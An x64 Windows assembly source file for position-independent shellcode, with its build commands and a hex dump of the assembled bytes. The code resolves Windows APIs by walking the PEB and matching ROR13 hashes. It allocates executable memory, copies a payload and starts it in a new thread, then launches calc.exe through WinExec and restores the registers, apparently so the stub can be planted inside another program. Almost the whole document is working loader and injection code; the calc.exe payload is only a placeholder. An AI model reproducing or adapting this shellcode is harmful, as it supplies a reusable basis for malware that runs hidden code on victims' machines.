;; nasm -f win64 command_shellcodex64.asm
;; C:\ProgramFiles\c\bin\gcc.exe command_shellcodex64.obj -o command_shellcodex64.exe

section .text
global WinMain@16

WinMain@16:
                        nop
                        push   rax
                        push   rbx
                        push   rcx
                        push   rdx
                        push   rsi
                        push   rdi
                        push   rbp
                        push   r8
                        push   r9
                        push   r10
                        push   r11
                        push   r12
                        push   r13
                        push   r14
                        push   r15
                        pushf
                        nop
                        call   call_1
                        push   r9
                        push   r8
                        push   rdx
                        push   rcx
                        push   rsi
                        xor    rdx, rdx
                        mov    rdx, [gs:rdx+0x60]
                        mov    rdx, [rdx+0x18]
                        mov    rdx, [rdx+0x20]
               call_8:  mov    rsi, [rdx+0x50]
                        movzx  rcx, WORD [rdx+0x4a]
                        xor    r9, r9
               call_3:  xor    rax, rax
                        lodsb
                        cmp    al, 0x61
                        jl     call_2
                        sub    al, 0x20
               call_2:  ror    r9d, 0xd
                        add    r9d, eax
                        loop   call_3
                        push   rdx
                        push   r9
                        mov    rdx, [rdx+0x20]
                        mov    eax, [rdx+0x3c]
                        add    rax, rdx
                        mov    eax, [rax+0x88]
                        test   rax, rax
                        je     call_4
                        add    rax,rdx
                        push   rax
                        mov    ecx, [rax+0x18]
                        mov    r8d, [rax+0x20]
                        add    r8, rdx
               call_7:  jrcxz  call_5
                        dec    rcx
                        mov    esi, [r8+rcx*4]
                        add    rsi, rdx
                        xor    r9, r9
               call_6:  xor    rax, rax
                        lodsb
                        ror    r9d, 0xd
                        add    r9d, eax
                        cmp    al, ah
                        jne    call_6
                        add    r9, [rsp+0x8]
                        cmp    r9d, r10d
                        jne    call_7
                        pop    rax
                        mov    r8d, [rax+0x24]
                        add    r8, rdx
                        mov    cx, [r8+rcx*2]
                        mov    r8d, [rax+0x1c]
                        add    r8, rdx
                        mov    eax, [r8+rcx*4]
                        add    rax, rdx
                        pop    r8
                        pop    r8
                        pop    rsi
                        pop    rcx
                        pop    rdx
                        pop    r8
                        pop    r9
                        pop    r10
                        sub    rsp, 0x20
                        push   r10
                        jmp    rax
               call_5:  pop    rax
               call_4:  pop    r9
                        pop    rdx
                        mov    rdx, [rdx]
                        jmp    call_8
               call_1:  pop    rbp
                        mov    r14, 0x112
                        push   0x40
                        pop    r9
                        push   0x1000
                        pop    r8
                        mov    rdx, r14
                        push   0x0
                        pop    rcx
                        push   0xffffffffe553a458
                        pop    r10
                        call   rbp
                        mov    rbx, rax
                        mov    rdi, rax
                        mov    rcx, 0x112
                        jmp    call_9
                        pop    rsi
                        repnz movsb
                        call   call_10
              call_10:  xor    rax, rax
                        push   rax
                        push   rax
                        mov    r9, rax
                        mov    rdx, rax
                        mov    r8, rbx
                        mov    rcx, rax
                        mov    r10, 0x160d6838
                        call   rbp
                        add    rsp, 0x58
                        popf
                        pop    r15
                        pop    r14
                        pop    r13
                        pop    r12
                        pop    r11
                        pop    r10
                        pop    r9
                        pop    r8
                        pop    rbp
                        pop    rsp
                        pop    rdi
                        pop    rsi
                        pop    rdx
                        pop    rcx
                        pop    rbx
                        pop    rax
                        dd     0x000117e9
               call_9:  add    al, ch
                        mov    eax, 0xfcffffff
                        and    rsp, 0xfffffffffffffff0
                        call   call_11
                        push   r9
                        push   r8
                        push   rdx
                        push   rcx
                        push   rsi
                        xor    rdx, rdx
                        mov    rdx, [gs:rdx+0x60]
                        mov    rdx, [rdx+0x18]
                        mov    rdx, [rdx+0x20]
              call_18:  mov    rsi, [rdx+0x50]
                        movzx  rcx, WORD [rdx+0x4a]
                        xor    r9, r9
              call_13:  xor    rax, rax
                        lodsb
                        cmp    al, 0x61
                        jl     call_12
                        sub    al, 0x20
              call_12:  ror    r9d, 0xd
                        add    r9d, eax
                        loop   call_13
                        push   rdx
                        push   r9
                        mov    rdx, [rdx+0x20]
                        mov    eax, [rdx+0x3c]
                        add    rax, rdx
                        mov    eax, [rax+0x88]
                        test   rax, rax
                        je     call_14
                        add    rax, rdx
                        push   rax
                        mov    ecx, [rax+0x18]
                        mov    r8d, [rax+0x20]
                        add    r8, rdx
              call_17:  jrcxz  call_15
                        dec    rcx
                        mov    esi, [r8+rcx*4]
                        add    rsi, rdx
                        xor    r9, r9
              call_16:  xor    rax, rax
                        lodsb
                        ror    r9d, 0xd
                        add    r9d, eax
                        cmp    al, ah
                        jne    call_16
                        add    r9, [rsp+0x8]
                        cmp    r9d, r10d
                        jne    call_17
                        pop    rax
                        mov    r8d, [rax+0x24]
                        add    r8, rdx
                        mov    cx, [r8+rcx*2]
                        mov    r8d, [rax+0x1c]
                        add    r8, rdx
                        mov    eax, [r8+rcx*4]
                        add    rax,rdx
                        pop    r8
                        pop    r8
                        pop    rsi
                        pop    rcx
                        pop    rdx
                        pop    r8
                        pop    r9
                        pop    r10
                        sub    rsp, 0x20
                        push   r10
                        jmp    rax
              call_15:  pop    rax
              call_14:  pop    r9
                        pop    rdx
                        mov    rdx, [rdx]
                        jmp    call_18
              call_11:  pop    rbp
                        mov    rdx, 0x1
                        lea    rcx, [rbp+0xfe]
                        mov    r10d, 0x876f8b31
                        call   rbp
                        mov    ebx, 0x5de2c5aa
                        mov    r10d, 0x9dbd95a6
                        call   rbp
                        add    rsp, 0x28
                        cmp    al, 0x6
                        jl     call_19
                        cmp    bl, 0xe0
                        jne    call_19
                        mov    ebx, 0x6f721347
              call_19:  push   0x0
                        pop    rcx
                        mov    r10d, ebx
                        call   rbp
                        jmp    call_20
                   db   0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00, 0xe9, 0x6e, 0x92, 0xff, 0xff
              call_20:
                        add    rsp, 96
                        xor    rbp, rbp
                        popf
                        pop    r15
                        pop    r14
                        pop    r13
                        pop    r12
                        pop    r11
                        pop    r10
                        pop    r9
                        pop    r8
                        pop    rbp
                        pop    rdi
                        pop    rsi
                        pop    rdx
                        pop    rcx
                        pop    rbx
                        pop    rax


;; 9050535152565755415041514152415341544155415641579c90e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d41be120100006a404159680010000041584c89f26a00596858a453e5415affd54889c34889c7b912010000eb425ef2a4e8000000004831c050504989c14889c24989d84889c141ba38680d16ffd54883c4589d415f415e415d415c415b415a415941585d5c5f5e5a595b58e917010000e8b8fffffffc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5dba01000000488d8d0101000041ba318b6f87ffd5bbaac5e25d41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5e90e00000063616c632e65786500e96e92ffff4883c4604831ed9d415f415e415d415c415b415a415941585d5f5e5a595b58